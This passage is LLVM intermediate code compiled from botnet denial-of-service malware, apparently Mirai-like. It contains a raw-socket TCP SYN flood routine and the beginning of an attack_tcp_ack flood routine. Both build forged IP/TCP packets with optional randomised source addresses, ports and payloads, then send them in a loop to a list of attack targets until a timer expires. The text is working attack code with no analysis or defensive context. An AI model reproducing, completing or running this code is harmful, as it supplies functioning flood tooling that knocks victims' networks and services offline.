  store i32 1, i32* %6, align 4
  %44 = bitcast i32* %6 to i8*
  %45 = call i32 @setsockopt(i32 %41, i32 0, i32 3, i8* nonnull %44, i32 4) #10
  %46 = icmp eq i32 %45, -1
  br i1 %46, label %113, label %.preheader131

.preheader131:                                    ; preds = %43
  store i32 0, i32* %6, align 4
  %47 = zext i8 %1 to i32
  %48 = icmp eq i8 %1, 0
  br i1 %48, label %.preheader, label %.lr.ph133

.lr.ph133:                                        ; preds = %.preheader131
  %49 = icmp eq i8 %17, 0
  %50 = trunc i32 %22 to i16
  %51 = and i8 %25, 1
  %52 = zext i8 %51 to i16
  %53 = shl nuw nsw i16 %52, 13
  %54 = shl i16 %27, 12
  %55 = and i16 %54, 4096
  %56 = shl i16 %29, 11
  %57 = and i16 %56, 2048
  %58 = shl i16 %31, 10
  %59 = and i16 %58, 1024
  %60 = shl i16 %33, 9
  %61 = and i16 %60, 512
  %62 = shl i16 %35, 8
  %63 = and i16 %62, 256
  %64 = or i16 %53, %55
  %65 = or i16 %64, %57
  %66 = or i16 %65, %59
  %.masked = or i16 %66, %61
  %67 = or i16 %.masked, %63
  %68 = or i16 %67, 160
  %69 = zext i8 %1 to i64
  br i1 %49, label %.lr.ph133.split.us.preheader, label %.lr.ph133.split.preheader

.lr.ph133.split.preheader:                        ; preds = %.lr.ph133
  br label %.lr.ph133.split

.lr.ph133.split.us.preheader:                     ; preds = %.lr.ph133
  br label %.lr.ph133.split.us

.lr.ph133.split.us:                               ; preds = %.lr.ph133.split.us.preheader, %.lr.ph133.split.us
  %indvars.iv = phi i64 [ %indvars.iv.next, %.lr.ph133.split.us ], [ 0, %.lr.ph133.split.us.preheader ]
  %70 = call noalias i8* @calloc(i64 128, i64 1) #10
  %71 = getelementptr inbounds i8*, i8** %9, i64 %indvars.iv
  store i8* %70, i8** %71, align 8
  %72 = getelementptr inbounds i8, i8* %70, i64 20
  %73 = getelementptr inbounds i8, i8* %70, i64 40
  store i8 69, i8* %70, align 4
  %74 = getelementptr inbounds i8, i8* %70, i64 1
  store i8 %11, i8* %74, align 1
  %75 = call zeroext i16 @htons(i16 zeroext 60) #11
  %76 = getelementptr inbounds i8, i8* %70, i64 2
  %77 = bitcast i8* %76 to i16*
  store i16 %75, i16* %77, align 2
  %78 = call zeroext i16 @htons(i16 zeroext %13) #11
  %79 = getelementptr inbounds i8, i8* %70, i64 4
  %80 = bitcast i8* %79 to i16*
  store i16 %78, i16* %80, align 4
  %81 = getelementptr inbounds i8, i8* %70, i64 8
  store i8 %15, i8* %81, align 4
  %82 = getelementptr inbounds i8, i8* %70, i64 9
  store i8 6, i8* %82, align 1
  %83 = getelementptr inbounds i8, i8* %70, i64 12
  %84 = bitcast i8* %83 to i32*
  store i32 %37, i32* %84, align 4
  %85 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %indvars.iv, i32 1
  %86 = load i32, i32* %85, align 4
  %87 = getelementptr inbounds i8, i8* %70, i64 16
  %88 = bitcast i8* %87 to i32*
  store i32 %86, i32* %88, align 4
  %89 = call zeroext i16 @htons(i16 zeroext %19) #11
  %90 = bitcast i8* %72 to i16*
  store i16 %89, i16* %90, align 4
  %91 = call zeroext i16 @htons(i16 zeroext %21) #11
  %92 = getelementptr inbounds i8, i8* %70, i64 22
  %93 = bitcast i8* %92 to i16*
  store i16 %91, i16* %93, align 2
  %94 = call zeroext i16 @htons(i16 zeroext %50) #11
  %95 = zext i16 %94 to i32
  %96 = getelementptr inbounds i8, i8* %70, i64 24
  %97 = bitcast i8* %96 to i32*
  store i32 %95, i32* %97, align 4
  %98 = getelementptr inbounds i8, i8* %70, i64 32
  %99 = bitcast i8* %98 to i16*
  store i16 %68, i16* %99, align 4
  %100 = getelementptr inbounds i8, i8* %70, i64 41
  store i8 2, i8* %73, align 1
  %101 = getelementptr inbounds i8, i8* %70, i64 42
  store i8 4, i8* %100, align 1
  %102 = call zeroext i16 @htons(i16 zeroext 1400) #11
  %103 = bitcast i8* %101 to i16*
  store i16 %102, i16* %103, align 2
  %104 = getelementptr inbounds i8, i8* %70, i64 44
  %105 = getelementptr inbounds i8, i8* %70, i64 45
  store i8 4, i8* %104, align 1
  %106 = getelementptr inbounds i8, i8* %70, i64 46
  store i8 2, i8* %105, align 1
  %107 = getelementptr inbounds i8, i8* %70, i64 47
  store i8 8, i8* %106, align 1
  store i8 10, i8* %107, align 1
  %108 = getelementptr inbounds i8, i8* %70, i64 56
  %109 = getelementptr inbounds i8, i8* %70, i64 57
  store i8 1, i8* %108, align 1
  %110 = getelementptr inbounds i8, i8* %70, i64 58
  store i8 3, i8* %109, align 1
  %111 = getelementptr inbounds i8, i8* %70, i64 59
  store i8 3, i8* %110, align 1
  store i8 6, i8* %111, align 1
  %indvars.iv.next = add nsw i64 %indvars.iv, 1
  %112 = icmp slt i64 %indvars.iv.next, %69
  br i1 %112, label %.lr.ph133.split.us, label %..preheader_crit_edge.loopexit

; <label>:113:                                    ; preds = %43
  %114 = call i32 @close(i32 %41) #10
  br label %.loopexit

..preheader_crit_edge.loopexit:                   ; preds = %.lr.ph133.split.us
  br label %..preheader_crit_edge

..preheader_crit_edge.loopexit145:                ; preds = %.lr.ph133.split
  br label %..preheader_crit_edge

..preheader_crit_edge:                            ; preds = %..preheader_crit_edge.loopexit145, %..preheader_crit_edge.loopexit
  %.lcssa134.in = phi i64 [ %indvars.iv.next, %..preheader_crit_edge.loopexit ], [ %indvars.iv.next139, %..preheader_crit_edge.loopexit145 ]
  %.lcssa134 = trunc i64 %.lcssa134.in to i32
  store i32 %.lcssa134, i32* %6, align 4
  br label %.preheader

.preheader:                                       ; preds = %.preheader131, %..preheader_crit_edge
  %115 = icmp eq i32 %37, -1
  %116 = and i32 %12, 65535
  %117 = icmp eq i32 %116, 65535
  %118 = and i32 %18, 65535
  %119 = icmp eq i32 %118, 65535
  %120 = and i32 %20, 65535
  %121 = icmp eq i32 %120, 65535
  %122 = icmp eq i32 %22, 65535
  %123 = icmp eq i32 %23, 65535
  %124 = icmp eq i8 %25, 0
  %sext = shl i64 %40, 32
  %125 = ashr exact i64 %sext, 32
  br label %172

.lr.ph133.split:                                  ; preds = %.lr.ph133.split.preheader, %.lr.ph133.split
  %indvars.iv138 = phi i64 [ %indvars.iv.next139, %.lr.ph133.split ], [ 0, %.lr.ph133.split.preheader ]
  %126 = call noalias i8* @calloc(i64 128, i64 1) #10
  %127 = getelementptr inbounds i8*, i8** %9, i64 %indvars.iv138
  store i8* %126, i8** %127, align 8
  %128 = getelementptr inbounds i8, i8* %126, i64 20
  %129 = getelementptr inbounds i8, i8* %126, i64 40
  store i8 69, i8* %126, align 4
  %130 = getelementptr inbounds i8, i8* %126, i64 1
  store i8 %11, i8* %130, align 1
  %131 = call zeroext i16 @htons(i16 zeroext 60) #11
  %132 = getelementptr inbounds i8, i8* %126, i64 2
  %133 = bitcast i8* %132 to i16*
  store i16 %131, i16* %133, align 2
  %134 = call zeroext i16 @htons(i16 zeroext %13) #11
  %135 = getelementptr inbounds i8, i8* %126, i64 4
  %136 = bitcast i8* %135 to i16*
  store i16 %134, i16* %136, align 4
  %137 = getelementptr inbounds i8, i8* %126, i64 8
  store i8 %15, i8* %137, align 4
  %138 = call zeroext i16 @htons(i16 zeroext 16384) #11
  %139 = getelementptr inbounds i8, i8* %126, i64 6
  %140 = bitcast i8* %139 to i16*
  store i16 %138, i16* %140, align 2
  %141 = getelementptr inbounds i8, i8* %126, i64 9
  store i8 6, i8* %141, align 1
  %142 = getelementptr inbounds i8, i8* %126, i64 12
  %143 = bitcast i8* %142 to i32*
  store i32 %37, i32* %143, align 4
  %144 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %indvars.iv138, i32 1
  %145 = load i32, i32* %144, align 4
  %146 = getelementptr inbounds i8, i8* %126, i64 16
  %147 = bitcast i8* %146 to i32*
  store i32 %145, i32* %147, align 4
  %148 = call zeroext i16 @htons(i16 zeroext %19) #11
  %149 = bitcast i8* %128 to i16*
  store i16 %148, i16* %149, align 4
  %150 = call zeroext i16 @htons(i16 zeroext %21) #11
  %151 = getelementptr inbounds i8, i8* %126, i64 22
  %152 = bitcast i8* %151 to i16*
  store i16 %150, i16* %152, align 2
  %153 = call zeroext i16 @htons(i16 zeroext %50) #11
  %154 = zext i16 %153 to i32
  %155 = getelementptr inbounds i8, i8* %126, i64 24
  %156 = bitcast i8* %155 to i32*
  store i32 %154, i32* %156, align 4
  %157 = getelementptr inbounds i8, i8* %126, i64 32
  %158 = bitcast i8* %157 to i16*
  store i16 %68, i16* %158, align 4
  %159 = getelementptr inbounds i8, i8* %126, i64 41
  store i8 2, i8* %129, align 1
  %160 = getelementptr inbounds i8, i8* %126, i64 42
  store i8 4, i8* %159, align 1
  %161 = call zeroext i16 @htons(i16 zeroext 1400) #11
  %162 = bitcast i8* %160 to i16*
  store i16 %161, i16* %162, align 2
  %163 = getelementptr inbounds i8, i8* %126, i64 44
  %164 = getelementptr inbounds i8, i8* %126, i64 45
  store i8 4, i8* %163, align 1
  %165 = getelementptr inbounds i8, i8* %126, i64 46
  store i8 2, i8* %164, align 1
  %166 = getelementptr inbounds i8, i8* %126, i64 47
  store i8 8, i8* %165, align 1
  store i8 10, i8* %166, align 1
  %167 = getelementptr inbounds i8, i8* %126, i64 56
  %168 = getelementptr inbounds i8, i8* %126, i64 57
  store i8 1, i8* %167, align 1
  %169 = getelementptr inbounds i8, i8* %126, i64 58
  store i8 3, i8* %168, align 1
  %170 = getelementptr inbounds i8, i8* %126, i64 59
  store i8 3, i8* %169, align 1
  store i8 6, i8* %170, align 1
  %indvars.iv.next139 = add nsw i64 %indvars.iv138, 1
  %171 = icmp slt i64 %indvars.iv.next139, %69
  br i1 %171, label %.lr.ph133.split, label %..preheader_crit_edge.loopexit145

; <label>:172:                                    ; preds = %.preheader, %._crit_edge
  store i32 0, i32* %6, align 4
  br i1 %48, label %._crit_edge, label %.lr.ph

.lr.ph:                                           ; preds = %172
  br i1 %115, label %.lr.ph.split.us.preheader, label %.lr.ph.split.preheader

.lr.ph.split.preheader:                           ; preds = %.lr.ph
  br label %.lr.ph.split

.lr.ph.split.us.preheader:                        ; preds = %.lr.ph
  br label %.lr.ph.split.us

.lr.ph.split.us:                                  ; preds = %.lr.ph.split.us.preheader, %214
  %173 = phi i32 [ %231, %214 ], [ 0, %.lr.ph.split.us.preheader ]
  %174 = sext i32 %173 to i64
  %175 = getelementptr inbounds i8*, i8** %9, i64 %174
  %176 = load i8*, i8** %175, align 8
  %177 = bitcast i8* %176 to %struct.iphdr*
  %178 = getelementptr inbounds i8, i8* %176, i64 20
  %179 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %174, i32 2
  %180 = load i8, i8* %179, align 4
  %181 = icmp ult i8 %180, 32
  br i1 %181, label %182, label %189

; <label>:182:                                    ; preds = %.lr.ph.split.us
  %183 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %174, i32 1
  %184 = load i32, i32* %183, align 4
  %185 = call i32 @ntohl(i32 %184) #11
  %186 = call i32 @htonl(i32 %185) #11
  %187 = getelementptr inbounds i8, i8* %176, i64 16
  %188 = bitcast i8* %187 to i32*
  store i32 %186, i32* %188, align 4
  br label %189

; <label>:189:                                    ; preds = %.lr.ph.split.us, %182
  %190 = getelementptr inbounds i8, i8* %176, i64 12
  %191 = bitcast i8* %190 to i32*
  store i32 0, i32* %191, align 4
  br i1 %117, label %192, label %195

; <label>:192:                                    ; preds = %189
  %193 = getelementptr inbounds i8, i8* %176, i64 4
  %194 = bitcast i8* %193 to i16*
  store i16 0, i16* %194, align 4
  br label %195

; <label>:195:                                    ; preds = %192, %189
  br i1 %119, label %196, label %198

; <label>:196:                                    ; preds = %195
  %197 = bitcast i8* %178 to i16*
  store i16 0, i16* %197, align 4
  br label %198

; <label>:198:                                    ; preds = %196, %195
  br i1 %121, label %199, label %202

; <label>:199:                                    ; preds = %198
  %200 = getelementptr inbounds i8, i8* %176, i64 22
  %201 = bitcast i8* %200 to i16*
  store i16 0, i16* %201, align 2
  br label %202

; <label>:202:                                    ; preds = %199, %198
  br i1 %122, label %203, label %206

; <label>:203:                                    ; preds = %202
  %204 = getelementptr inbounds i8, i8* %176, i64 24
  %205 = bitcast i8* %204 to i32*
  store i32 0, i32* %205, align 4
  br label %206

; <label>:206:                                    ; preds = %203, %202
  br i1 %123, label %207, label %210

; <label>:207:                                    ; preds = %206
  %208 = getelementptr inbounds i8, i8* %176, i64 28
  %209 = bitcast i8* %208 to i32*
  store i32 0, i32* %209, align 4
  br label %210

; <label>:210:                                    ; preds = %207, %206
  br i1 %124, label %214, label %211

; <label>:211:                                    ; preds = %210
  %212 = getelementptr inbounds i8, i8* %176, i64 38
  %213 = bitcast i8* %212 to i16*
  store i16 0, i16* %213, align 2
  br label %214

; <label>:214:                                    ; preds = %211, %210
  %215 = getelementptr inbounds i8, i8* %176, i64 10
  %216 = bitcast i8* %215 to i16*
  store i16 0, i16* %216, align 2
  %217 = bitcast i8* %176 to i16*
  %218 = call zeroext i16 @checksum_generic(i16* %217, i32 20)
  store i16 %218, i16* %216, align 2
  %219 = getelementptr inbounds i8, i8* %176, i64 36
  %220 = bitcast i8* %219 to i16*
  store i16 0, i16* %220, align 4
  %221 = call zeroext i16 @htons(i16 zeroext 40) #11
  %222 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* nonnull %177, i8* nonnull %178, i16 zeroext %221, i32 40)
  store i16 %222, i16* %220, align 4
  %223 = getelementptr inbounds i8, i8* %176, i64 22
  %224 = bitcast i8* %223 to i16*
  %225 = load i16, i16* %224, align 2
  %226 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %174, i32 0, i32 1
  store i16 %225, i16* %226, align 2
  %227 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %174, i32 0
  %228 = bitcast %struct.sockaddr_in* %227 to %struct.sockaddr*
  %229 = call i64 @sendto(i32 %41, i8* nonnull %176, i64 60, i32 16384, %struct.sockaddr* %228, i32 16) #10
  %230 = load i32, i32* %6, align 4
  %231 = add nsw i32 %230, 1
  store i32 %231, i32* %6, align 4
  %232 = icmp slt i32 %231, %47
  br i1 %232, label %.lr.ph.split.us, label %._crit_edge.loopexit

.lr.ph.split:                                     ; preds = %.lr.ph.split.preheader, %272
  %233 = phi i32 [ %289, %272 ], [ 0, %.lr.ph.split.preheader ]
  %234 = sext i32 %233 to i64
  %235 = getelementptr inbounds i8*, i8** %9, i64 %234
  %236 = load i8*, i8** %235, align 8
  %237 = bitcast i8* %236 to %struct.iphdr*
  %238 = getelementptr inbounds i8, i8* %236, i64 20
  %239 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %234, i32 2
  %240 = load i8, i8* %239, align 4
  %241 = icmp ult i8 %240, 32
  br i1 %241, label %242, label %249

; <label>:242:                                    ; preds = %.lr.ph.split
  %243 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %234, i32 1
  %244 = load i32, i32* %243, align 4
  %245 = call i32 @ntohl(i32 %244) #11
  %246 = call i32 @htonl(i32 %245) #11
  %247 = getelementptr inbounds i8, i8* %236, i64 16
  %248 = bitcast i8* %247 to i32*
  store i32 %246, i32* %248, align 4
  br label %249

; <label>:249:                                    ; preds = %.lr.ph.split, %242
  br i1 %117, label %250, label %253

; <label>:250:                                    ; preds = %249
  %251 = getelementptr inbounds i8, i8* %236, i64 4
  %252 = bitcast i8* %251 to i16*
  store i16 0, i16* %252, align 4
  br label %253

; <label>:253:                                    ; preds = %250, %249
  br i1 %119, label %254, label %256

; <label>:254:                                    ; preds = %253
  %255 = bitcast i8* %238 to i16*
  store i16 0, i16* %255, align 4
  br label %256

; <label>:256:                                    ; preds = %254, %253
  br i1 %121, label %257, label %260

; <label>:257:                                    ; preds = %256
  %258 = getelementptr inbounds i8, i8* %236, i64 22
  %259 = bitcast i8* %258 to i16*
  store i16 0, i16* %259, align 2
  br label %260

; <label>:260:                                    ; preds = %257, %256
  br i1 %122, label %261, label %264

; <label>:261:                                    ; preds = %260
  %262 = getelementptr inbounds i8, i8* %236, i64 24
  %263 = bitcast i8* %262 to i32*
  store i32 0, i32* %263, align 4
  br label %264

; <label>:264:                                    ; preds = %261, %260
  br i1 %123, label %265, label %268

; <label>:265:                                    ; preds = %264
  %266 = getelementptr inbounds i8, i8* %236, i64 28
  %267 = bitcast i8* %266 to i32*
  store i32 0, i32* %267, align 4
  br label %268

; <label>:268:                                    ; preds = %265, %264
  br i1 %124, label %272, label %269

; <label>:269:                                    ; preds = %268
  %270 = getelementptr inbounds i8, i8* %236, i64 38
  %271 = bitcast i8* %270 to i16*
  store i16 0, i16* %271, align 2
  br label %272

; <label>:272:                                    ; preds = %268, %269
  %273 = getelementptr inbounds i8, i8* %236, i64 10
  %274 = bitcast i8* %273 to i16*
  store i16 0, i16* %274, align 2
  %275 = bitcast i8* %236 to i16*
  %276 = call zeroext i16 @checksum_generic(i16* %275, i32 20)
  store i16 %276, i16* %274, align 2
  %277 = getelementptr inbounds i8, i8* %236, i64 36
  %278 = bitcast i8* %277 to i16*
  store i16 0, i16* %278, align 4
  %279 = call zeroext i16 @htons(i16 zeroext 40) #11
  %280 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %237, i8* %238, i16 zeroext %279, i32 40)
  store i16 %280, i16* %278, align 4
  %281 = getelementptr inbounds i8, i8* %236, i64 22
  %282 = bitcast i8* %281 to i16*
  %283 = load i16, i16* %282, align 2
  %284 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %234, i32 0, i32 1
  store i16 %283, i16* %284, align 2
  %285 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %234, i32 0
  %286 = bitcast %struct.sockaddr_in* %285 to %struct.sockaddr*
  %287 = call i64 @sendto(i32 %41, i8* %236, i64 60, i32 16384, %struct.sockaddr* %286, i32 16) #10
  %288 = load i32, i32* %6, align 4
  %289 = add nsw i32 %288, 1
  store i32 %289, i32* %6, align 4
  %290 = icmp slt i32 %289, %47
  br i1 %290, label %.lr.ph.split, label %._crit_edge.loopexit144

._crit_edge.loopexit:                             ; preds = %214
  br label %._crit_edge

._crit_edge.loopexit144:                          ; preds = %272
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit144, %._crit_edge.loopexit, %172
  %291 = call i64 @time(i64* null) #10
  %292 = icmp sgt i64 %291, %125
  br i1 %292, label %.loopexit.loopexit, label %172

.loopexit.loopexit:                               ; preds = %._crit_edge
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %5, %113
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_tcp_ack(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %6 = alloca i32, align 4
  store i32 0, i32* %6, align 4
  %7 = zext i8 %1 to i64
  %8 = tail call noalias i8* @calloc(i64 %7, i64 8) #10
  %9 = bitcast i8* %8 to i8**
  %10 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 2, i32 0)
  %11 = trunc i32 %10 to i8
  %12 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 3, i32 65535)
  %13 = trunc i32 %12 to i16
  %14 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 4, i32 64)
  %15 = trunc i32 %14 to i8
  %16 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 5, i32 0)
  %17 = trunc i32 %16 to i8
  %18 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 6, i32 65535)
  %19 = trunc i32 %18 to i16
  %20 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 7, i32 65535)
  %21 = trunc i32 %20 to i16
  %22 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 16, i32 65535)
  %23 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 17, i32 65535)
  %24 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 10, i32 0)
  %25 = trunc i32 %24 to i16
  %26 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 11, i32 1)
  %27 = trunc i32 %26 to i16
  %28 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 12, i32 0)
  %29 = trunc i32 %28 to i8
  %30 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 13, i32 0)
  %31 = trunc i32 %30 to i16
  %32 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 14, i32 0)
  %33 = trunc i32 %32 to i16
  %34 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 15, i32 0)
  %35 = trunc i32 %34 to i16
  %36 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 0, i32 512)
  %37 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 1, i32 1)
  %38 = trunc i32 %37 to i8
  %39 = load i32, i32* @LOCAL_ADDR, align 4
  %40 = tail call i32 @attack_get_opt_ip(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 24, i32 %39)
  %41 = tail call i64 @time(i64* null) #10
  %42 = zext i32 %0 to i64
  %43 = add i64 %41, %42
  %44 = tail call i32 @socket(i32 2, i32 3, i32 6) #10
  %45 = icmp eq i32 %44, -1
  br i1 %45, label %.loopexit, label %46

; <label>:46:                                     ; preds = %5
  store i32 1, i32* %6, align 4
  %47 = bitcast i32* %6 to i8*
  %48 = call i32 @setsockopt(i32 %44, i32 0, i32 3, i8* nonnull %47, i32 4) #10
  %49 = icmp eq i32 %48, -1
  br i1 %49, label %111, label %.preheader134

.preheader134:                                    ; preds = %46
  store i32 0, i32* %6, align 4
  %50 = zext i8 %1 to i32
  %51 = icmp eq i8 %1, 0
  %.pre140 = sext i32 %36 to i64
  %.pre141 = add nsw i64 %.pre140, 40
  br i1 %51, label %.preheader, label %.lr.ph136

.lr.ph136:                                        ; preds = %.preheader134
  %52 = trunc i64 %.pre141 to i16
  %53 = icmp eq i8 %17, 0
  %54 = trunc i32 %22 to i16
  %55 = shl i16 %25, 13
  %56 = and i16 %55, 8192
  %57 = shl i16 %27, 12
  %58 = and i16 %57, 4096
  %59 = and i8 %29, 1
  %60 = zext i8 %59 to i16
  %61 = shl nuw nsw i16 %60, 11
  %62 = shl i16 %31, 10
  %63 = and i16 %62, 1024
  %64 = shl i16 %33, 9
  %65 = and i16 %64, 512
  %66 = shl i16 %35, 8
  %67 = and i16 %66, 256
  %68 = or i16 %56, %58
  %69 = or i16 %68, %61
  %70 = or i16 %69, %63
  %.masked = or i16 %70, %65
  %71 = or i16 %.masked, %67
  %72 = or i16 %71, 80
  %73 = icmp eq i8 %29, 0
  %74 = or i16 %71, 2128
  br i1 %53, label %.lr.ph136.split.us.preheader, label %.lr.ph136.split.preheader

.lr.ph136.split.preheader:                        ; preds = %.lr.ph136
  %.145 = select i1 %73, i16 %72, i16 %74
  br label %.lr.ph136.split

.lr.ph136.split.us.preheader:                     ; preds = %.lr.ph136
  %. = select i1 %73, i16 %72, i16 %74
  br label %.lr.ph136.split.us

.lr.ph136.split.us:                               ; preds = %.lr.ph136.split.us.preheader, %.lr.ph136.split.us
  %75 = phi i32 [ %109, %.lr.ph136.split.us ], [ 0, %.lr.ph136.split.us.preheader ]
  %76 = call noalias i8* @calloc(i64 1510, i64 1) #10
  %77 = sext i32 %75 to i64
  %78 = getelementptr inbounds i8*, i8** %9, i64 %77
  store i8* %76, i8** %78, align 8
  %79 = getelementptr inbounds i8, i8* %76, i64 20
  %80 = getelementptr inbounds i8, i8* %76, i64 40
  store i8 69, i8* %76, align 4
  %81 = getelementptr inbounds i8, i8* %76, i64 1
  store i8 %11, i8* %81, align 1
  %82 = call zeroext i16 @htons(i16 zeroext %52) #11
  %83 = getelementptr inbounds i8, i8* %76, i64 2
  %84 = bitcast i8* %83 to i16*
  store i16 %82, i16* %84, align 2
  %85 = call zeroext i16 @htons(i16 zeroext %13) #11
  %86 = getelementptr inbounds i8, i8* %76, i64 4
  %87 = bitcast i8* %86 to i16*
  store i16 %85, i16* %87, align 4
  %88 = getelementptr inbounds i8, i8* %76, i64 8
  store i8 %15, i8* %88, align 4
  %89 = getelementptr inbounds i8, i8* %76, i64 9
  store i8 6, i8* %89, align 1
  %90 = getelementptr inbounds i8, i8* %76, i64 12
  %91 = bitcast i8* %90 to i32*
  store i32 %40, i32* %91, align 4
  %92 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %77, i32 1
  %93 = load i32, i32* %92, align 4
  %94 = getelementptr inbounds i8, i8* %76, i64 16
  %95 = bitcast i8* %94 to i32*
  store i32 %93, i32* %95, align 4
  %96 = call zeroext i16 @htons(i16 zeroext %19) #11
  %97 = bitcast i8* %79 to i16*
  store i16 %96, i16* %97, align 4
  %98 = call zeroext i16 @htons(i16 zeroext %21) #11
  %99 = getelementptr inbounds i8, i8* %76, i64 22
  %100 = bitcast i8* %99 to i16*
  store i16 %98, i16* %100, align 2
  %101 = call zeroext i16 @htons(i16 zeroext %54) #11
  %102 = zext i16 %101 to i32
  %103 = getelementptr inbounds i8, i8* %76, i64 24
  %104 = bitcast i8* %103 to i32*
  store i32 %102, i32* %104, align 4
  %105 = getelementptr inbounds i8, i8* %76, i64 32
  %106 = bitcast i8* %105 to i16*
  store i16 %., i16* %106, align 4
  call void @rand_alphastr(i8* nonnull %80, i32 %36)
  %107 = getelementptr inbounds i8, i8* %80, i64 %.pre140
  store i8 0, i8* %107, align 1
  %108 = load i32, i32* %6, align 4
  %109 = add nsw i32 %108, 1
  store i32 %109, i32* %6, align 4
  %110 = icmp slt i32 %109, %50
  br i1 %110, label %.lr.ph136.split.us, label %.preheader.loopexit

; <label>:111:                                    ; preds = %46
  %112 = call i32 @close(i32 %44) #10
  br label %.loopexit

.preheader.loopexit:                              ; preds = %.lr.ph136.split.us
  br label %.preheader

.preheader.loopexit149:                           ; preds = %.lr.ph136.split
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit149, %.preheader.loopexit, %.preheader134
  %113 = icmp eq i32 %40, -1
  %114 = and i32 %12, 65535
  %115 = icmp eq i32 %114, 65535
  %116 = and i32 %18, 65535
  %117 = icmp eq i32 %116, 65535
  %118 = and i32 %20, 65535
  %119 = icmp eq i32 %118, 65535
  %120 = icmp eq i32 %22, 65535
  %121 = icmp eq i32 %23, 65535
  %122 = icmp eq i8 %38, 0
  %123 = add nsw i64 %.pre140, 20
  %124 = trunc i64 %123 to i16
  %125 = trunc i64 %123 to i32
  %sext = shl i64 %43, 32
  %126 = ashr exact i64 %sext, 32
  br label %166

.lr.ph136.split:                                  ; preds = %.lr.ph136.split.preheader, %.lr.ph136.split
  %127 = phi i32 [ %164, %.lr.ph136.split ], [ 0, %.lr.ph136.split.preheader ]
  %128 = call noalias i8* @calloc(i64 1510, i64 1) #10
  %129 = sext i32 %127 to i64
  %130 = getelementptr inbounds i8*, i8** %9, i64 %129
  store i8* %128, i8** %130, align 8
  %131 = getelementptr inbounds i8, i8* %128, i64 20
  %132 = getelementptr inbounds i8, i8* %128, i64 40
  store i8 69, i8* %128, align 4
  %133 = getelementptr inbounds i8, i8* %128, i64 1
  store i8 %11, i8* %133, align 1
  %134 = call zeroext i16 @htons(i16 zeroext %52) #11
  %135 = getelementptr inbounds i8, i8* %128, i64 2
  %136 = bitcast i8* %135 to i16*
  store i16 %134, i16* %136, align 2
  %137 = call zeroext i16 @htons(i16 zeroext %13) #11
  %138 = getelementptr inbounds i8, i8* %128, i64 4
  %139 = bitcast i8* %138 to i16*
  store i16 %137, i16* %139, align 4
  %140 = getelementptr inbounds i8, i8* %128, i64 8
  store i8 %15, i8* %140, align 4
  %141 = call zeroext i16 @htons(i16 zeroext 16384) #11
  %142 = getelementptr inbounds i8, i8* %128, i64 6
  %143 = bitcast i8* %142 to i16*
  store i16 %141, i16* %143, align 2
  %144 = getelementptr inbounds i8, i8* %128, i64 9
  store i8 6, i8* %144, align 1
  %145 = getelementptr inbounds i8, i8* %128, i64 12
  %146 = bitcast i8* %145 to i32*
  store i32 %40, i32* %146, align 4
  %147 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %129, i32 1
  %148 = load i32, i32* %147, align 4
  %149 = getelementptr inbounds i8, i8* %128, i64 16
  %150 = bitcast i8* %149 to i32*
  store i32 %148, i32* %150, align 4
  %151 = call zeroext i16 @htons(i16 zeroext %19) #11
  %152 = bitcast i8* %131 to i16*
  store i16 %151, i16* %152, align 4
  %153 = call zeroext i16 @htons(i16 zeroext %21) #11
  %154 = getelementptr inbounds i8, i8* %128, i64 22
  %155 = bitcast i8* %154 to i16*
  store i16 %153, i16* %155, align 2
  %156 = call zeroext i16 @htons(i16 zeroext %54) #11
  %157 = zext i16 %156 to i32
  %158 = getelementptr inbounds i8, i8* %128, i64 24
  %159 = bitcast i8* %158 to i32*
  store i32 %157, i32* %159, align 4
  %160 = getelementptr inbounds i8, i8* %128, i64 32
  %161 = bitcast i8* %160 to i16*
  store i16 %.145, i16* %161, align 4
  call void @rand_alphastr(i8* nonnull %132, i32 %36)
  %162 = getelementptr inbounds i8, i8* %132, i64 %.pre140
  store i8 0, i8* %162, align 1
